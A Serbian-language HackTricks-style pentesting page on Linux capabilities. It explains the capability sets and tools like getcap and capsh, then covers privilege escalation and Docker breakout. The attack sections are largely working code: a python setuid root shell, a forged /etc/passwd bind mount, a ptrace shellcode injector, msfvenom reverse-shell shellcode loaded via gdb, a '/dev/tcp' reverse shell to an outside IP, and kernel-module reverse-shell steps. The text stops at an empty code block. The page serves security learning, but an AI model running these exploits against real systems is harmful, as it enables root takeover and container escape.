# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilities dele **root privilegije na manje, zasebne jedinice**, omogućavajući procesima da imaju podskup privilegija. Ovo smanjuje rizike tako što se ne dodeljuju pune root privilegije kada to nije neophodno.<sup>[[5]](#references)</sup>

### Problem:

- Normalni korisnici imaju ograničene dozvole, što utiče na zadatke kao što je otvaranje mrežnog socket-a, za šta je potreban root pristup.

### Skupovi capabilities:

1. **Inherited (CapInh)**:

- **Svrha**: Određuje capabilities koje se prenose sa roditeljskog procesa.
- **Funkcionalnost**: Kada se kreira novi proces, on nasleđuje capabilities svog roditelja iz ovog skupa. Korisno za održavanje određenih privilegija tokom kreiranja novih procesa.
- **Ograničenja**: Proces ne može dobiti capabilities koje njegov roditelj nije posedovao.<sup>[[3]](#references)</sup>

2. **Effective (CapEff)**:

- **Svrha**: Predstavlja stvarne capabilities koje proces koristi u datom trenutku.
- **Funkcionalnost**: Ovo je skup capabilities koje kernel proverava kako bi odobrio dozvolu za različite operacije. Kod fajlova, ovaj skup može biti indikator da li capabilities dozvoljene za fajl treba smatrati efektivnim.
- **Značaj**: Efektivni skup je ključan za trenutne provere privilegija i predstavlja aktivni skup capabilities koje proces može da koristi.

3. **Permitted (CapPrm)**:

- **Svrha**: Definiše maksimalni skup capabilities koje proces može posedovati.
- **Funkcionalnost**: Proces može podići capability iz permitted skupa u svoj effective skup, čime dobija mogućnost da koristi tu capability. Takođe može ukloniti capabilities iz svog permitted skupa.
- **Granica**: Funkcioniše kao gornja granica capabilities koje proces može imati, čime se osigurava da proces ne prekorači unapred definisan opseg privilegija.

4. **Bounding (CapBnd)**:

- **Svrha**: Postavlja plafon capabilities koje proces ikada može dobiti tokom svog životnog ciklusa.
- **Funkcionalnost**: Čak i ako proces ima određenu capability u svom inheritable ili permitted skupu, ne može dobiti tu capability osim ako se ona takođe nalazi u bounding skupu.
- **Slučaj upotrebe**: Ovaj skup je naročito koristan za ograničavanje potencijala procesa za eskalaciju privilegija, dodajući dodatni sloj bezbednosti.

5. **Ambient (CapAmb)**:
- **Svrha**: Omogućava da se određene capabilities održe tokom `execve` sistemskog poziva, koji bi obično doveo do potpunog resetovanja capabilities procesa.
- **Funkcionalnost**: Osigurava da non-SUID programi koji nemaju povezane file capabilities mogu zadržati određene privilegije.
- **Ograničenja**: Capabilities u ovom skupu podležu ograničenjima inheritable i permitted skupova, čime se osigurava da ne prekorače privilegije dozvoljene procesu.<sup>[[8]](#references)[[9]](#references)</sup>
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
## Capabilities procesa i binarnih datoteka

### Capabilities procesa

Da biste videli capabilities određenog procesa, koristite datoteku **status** u direktorijumu /proc. Pošto pruža više detalja, ograničimo prikaz samo na informacije povezane sa Linux capabilities.\
Imajte na umu da se za sve pokrenute procese informacije o capabilities održavaju po thread-u, dok se za binarne datoteke u sistemu datoteka čuvaju u proširenim atributima.<sup>[[4]](#references)</sup>

Capabilities su definisane u /usr/include/linux/capability.h

Capabilities trenutnog procesa možete pronaći pomoću `cat /proc/self/status` ili komande `capsh --print`, a capabilities drugih korisnika u `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Ova komanda bi na većini sistema trebalo da vrati 5 linija.

- CapInh = Nasleđene capabilities
- CapPrm = Dozvoljene capabilities
- CapEff = Aktivne capabilities
- CapBnd = Bounding set
- CapAmb = Skup ambijentalnih capabilities
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Ovi heksadecimalni brojevi nemaju smisla. Pomoću uslužnog programa capsh možemo ih dekodirati u nazive capabilities.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Hajde da sada proverimo **capabilities** koje koristi `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Iako to funkcioniše, postoji još jedan i jednostavniji način. Da biste videli capabilities pokrenutog procesa, jednostavno koristite alat **getpcaps** nakon kog navedete ID procesa (PID). Takođe možete navesti listu ID-jeva procesa.
```bash
getpcaps 1234
```
Proverimo ovde capabilities programa `tcpdump` nakon što su binarnoj datoteci dodeljene dovoljne capabilities (`cap_net_admin` i `cap_net_raw`) za sniffing mreže (_tcpdump se izvršava u procesu 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Kao što možete videti, date capabilities odgovaraju rezultatima 2 načina za dobijanje capabilities binarnog fajla.\
Alat _getpcaps_ koristi sistemski poziv **capget()** da ispita dostupne capabilities za određenu nit. Ovaj sistemski poziv zahteva samo PID da bi dobio više informacija.

### Capabilities binarnih fajlova

Binarni fajlovi mogu imati capabilities koje se mogu koristiti tokom izvršavanja. Na primer, veoma je uobičajeno pronaći binarni fajl `ping` sa capability `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Možete **pretražiti binarne datoteke sa capabilities** pomoću:
```bash
getcap -r / 2>/dev/null
```
### Uklanjanje capabilities pomoću capsh

Ako uklonimo CAP*NET_RAW capabilities za _ping*, ping alat više ne bi trebalo da radi.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Pored izlaza same komande _capsh_, i sama komanda _tcpdump_ bi trebalo da prikaže grešku.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Greška jasno pokazuje da komandi ping nije dozvoljeno da otvori ICMP socket. Sada sa sigurnošću znamo da ovo funkcioniše očekivano.

### Uklanjanje Capabilities

Capabilities binarne datoteke možete ukloniti pomoću
```bash
setcap -r </path/to/binary>
```
## Korisničke capabilities

Očigledno je **moguće dodeliti capabilities i korisnicima**. To verovatno znači da će svaki proces koji korisnik pokrene moći da koristi capabilities tog korisnika.\
Na osnovu [ovoga](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [ovoga ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) i [ovoga ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user), potrebno je konfigurisati nekoliko novih fajlova da bi se korisniku dodelile određene capabilities, ali fajl koji dodeljuje capabilities svakom korisniku biće `/etc/security/capability.conf`.\
Primer fajla:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Environment Capabilities

Kompajliranjem sledećeg programa moguće je **pokrenuti bash shell unutar okruženja koje obezbeđuje capabilities**.
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Unutar **bash-a koji izvršava kompajlirani ambient binary** moguće je uočiti **nove capabilities** (običan korisnik neće imati nijednu capability u odeljku „current“).
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Možete **dodati samo capabilities koje su prisutne** u skupovima permitted i inheritable.

### Capability-aware/Capability-dumb binarne datoteke

**Capability-aware binaries neće koristiti nove capabilities** koje im je dodelilo okruženje, dok će ih **capability-dumb binaries koristiti**, jer ih neće odbaciti. Zbog toga su capability-dumb binaries ranjivi unutar posebnog okruženja koje binarnim datotekama dodeljuje capabilities.

## Capabilities servisa

Podrazumevano, **servis koji se izvršava kao root imaće dodeljene sve capabilities**, što u nekim slučajevima može biti opasno.\
Zato **konfiguracioni fajl servisa** omogućava da **navedete** capabilities koje želite da servis ima, kao i **korisnika** koji treba da izvršava servis, kako biste izbegli pokretanje servisa sa nepotrebnim privilegijama:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities u Docker Containers

Docker podrazumevano dodeljuje nekoliko capabilities kontejnerima. Veoma je lako proveriti koje su to capabilities pokretanjem:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities su korisne kada **želite da ograničite sopstvene procese nakon izvršavanja privilegovanih operacija** (npr. nakon podešavanja chroot-a i binding-a na socket). Međutim, mogu se iskoristiti prosleđivanjem zlonamernih komandi ili argumenata koji se zatim izvršavaju kao root.<sup>[[2]](#references)</sup>

Capabilities možete nametnuti programima pomoću `setcap`, a možete ih proveriti pomoću `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` znači da dodajete capability („-” bi ga uklonio) kao Effective i Permitted.

Da biste identifikovali programe u sistemu ili fascikli sa capability-jima:
```bash
getcap -r / 2>/dev/null
```
### Primer eksploatacije

U sledećem primeru, binarni fajl `/usr/bin/python2.6` je ranjiv na privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** potrebne da bi `tcpdump` **omogućio bilo kom korisniku da njuška pakete**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Poseban slučaj „praznih“ capabilities

[Iz dokumentacije](https://man7.org/linux/man-pages/man7/capabilities.7.html): Imajte na umu da se programskom fajlu mogu dodeliti prazni skupovi capabilities, pa je tako moguće kreirati set-user-ID-root program koji menja efektivni i sačuvani set-user-ID procesa koji izvršava program na 0, ali tom procesu ne dodeljuje capabilities. Ili, jednostavno rečeno, ako imate binary koji:

1. nije u vlasništvu root-a
2. nema postavljene `SUID`/`SGID` bitove
3. ima prazan skup capabilities (npr.: `getcap myelf` vraća `myelf =ep`)

onda će se **taj binary pokrenuti kao root**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** je izuzetno moćna Linux capability, često izjednačavana sa nivoom skoro ekvivalentnim root-u zbog svojih širokih **administrativnih privilegija**, kao što su montiranje uređaja ili manipulisanje funkcijama kernela. Iako je neophodna za kontejnere koji simuliraju čitave sisteme, **`CAP_SYS_ADMIN` predstavlja značajne bezbednosne izazove**, naročito u kontejnerizovanim okruženjima, zbog svog potencijala za eskalaciju privilegija i kompromitovanje sistema. Zbog toga njena upotreba zahteva stroge bezbednosne procene i pažljivo upravljanje, uz snažnu preporuku da se ova capability ukloni iz application-specific kontejnera kako bi se poštovao **princip najmanjih privilegija** i smanjila attack surface.

**Primer sa binaryjem**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Pomoću pythona možete montirati izmenjeni _passwd_ fajl preko pravog _passwd_ fajla:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
I na kraju **mount**-ujte izmenjeni `passwd` fajl na `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
I moći ćete da se **`su` kao root** koristeći lozinku „password“.

**Primer sa okruženjem (Docker breakout)**

Možete proveriti omogućene capabilities unutar docker container-a pomoću:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Unutar prethodnog izlaza možete videti da je capability SYS_ADMIN omogućena.

- **Mount**

Ovo omogućava Docker container-u da **montira disk hosta i da mu slobodno pristupa**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Potpuni pristup**

U prethodnoj metodi uspeli smo da pristupimo disku docker hosta.\
U slučaju da utvrdite da host pokreće **ssh** server, mogli biste da **kreirate korisnika na disku docker hosta** i pristupite mu putem SSH-a:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**To znači da možete pobeći iz container-a ubacivanjem shellcode-a u neki proces koji se izvršava unutar host-a.** Da bi pristupio procesima koji se izvršavaju unutar host-a, container mora biti pokrenut najmanje sa **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** omogućava korišćenje funkcionalnosti za debugging i praćenje sistemskih poziva koje pruža `ptrace(2)`, kao i cross-memory attach poziva poput `process_vm_readv(2)` i `process_vm_writev(2)`. Iako je moćan za potrebe dijagnostike i monitoringa, ako je `CAP_SYS_PTRACE` omogućen bez restriktivnih mera, kao što je seccomp filter nad `ptrace(2)`, može značajno ugroziti bezbednost sistema. Konkretno, može se iskoristiti za zaobilaženje drugih bezbednosnih ograničenja, naročito onih koje nameće seccomp, kao što je demonstrirano u [proofs of concept (PoC) poput ovog](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Primer sa binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Primer sa binarnim fajlom (gdb)**

`gdb` sa `ptrace` capability:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Kreirajte shellcode pomoću msfvenom-a za ubacivanje u memoriju putem gdb-a
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debugujte root proces pomoću gdb-a i copy-paste-ujte prethodno generisane gdb linije:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Primer sa okruženjem (Docker breakout) - Another gdb Abuse**

Ako je **GDB** instaliran (ili ga možete instalirati pomoću `apk add gdb` ili, na primer, `apt install gdb`), možete **debug-ovati proces sa hosta** i naterati ga da pozove funkciju `system`. (Za ovu tehniku je takođe potrebna capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Nećete moći da vidite izlaz izvršene komande, ali će je taj proces izvršiti (zato dobijte rev shell).

> [!WARNING]
> Ako dobijete grešku "No symbol "system" in current context.", pogledajte prethodni primer učitavanja shellcode-a u program putem gdb-a.

**Primer sa environment (Docker breakout) - Shellcode Injection**

Omogućene capabilities unutar docker kontejnera možete proveriti pomoću:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Izlistajte **procese** koji se izvršavaju na **hostu** `ps -eaf`

1. Utvrdite **architecture** `uname -m`
2. Pronađite **shellcode** za datu architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Pronađite **program** za **inject** **shellcode-a** u memoriju procesa ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Izmenite** **shellcode** unutar programa i **kompajlirajte** ga `gcc inject.c -o inject`
5. **Inject-ujte** ga i preuzmite svoj **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** omogućava procesu da **učitava i uklanja kernel module (`init_module(2)`, `finit_module(2)` i `delete_module(2)` system calls)**, pružajući direktan pristup osnovnim operacijama kernela. Ova capability predstavlja kritične bezbednosne rizike jer omogućava escalation of privileges i potpunu kompromitaciju sistema dozvoljavajući izmene kernela, čime se zaobilaze svi Linux security mechanisms, uključujući Linux Security Modules i izolaciju kontejnera.<sup>[[6]](#references)</sup>
**To znači da možete** **ubacivati/uklanjati kernel module u/iz kernela host mašine.**

**Primer sa binary-jem**

U sledećem primeru binary **`python`** ima ovu capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Po podrazumevanim podešavanjima, komanda **`modprobe`** proverava listu zavisnosti i map datoteke u direktorijumu **`/lib/modules/$(uname -r)`**.\
Da bismo ovo zloupotrebili, napravićemo lažni direktorijum **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Zatim **kompajlirajte kernel module koji možete pronaći u 2 primera ispod i kopirajte** ga u ovaj folder:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Na kraju, izvršite potreban Python code za učitavanje ovog kernel module:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Primer 2 sa binarnim fajlom**

U sledećem primeru binarni fajl **`kmod`** ima ovu capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Što znači da je moguće koristiti komandu **`insmod`** za ubacivanje kernel modula. Pratite primer u nastavku da biste dobili **reverse shell** zloupotrebom ove privilegije.

**Primer sa okruženjem (Docker breakout)**

Možete proveriti omogućene capabilities unutar docker containera koristeći:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
U prethodnom izlazu možete videti da je mogućnost **SYS_MODULE** omogućena.

**Kreirajte** **kernel module** koji će izvršiti reverse shell i **Makefile** za njegovu **kompilaciju**:
```c:reverse-shell.c
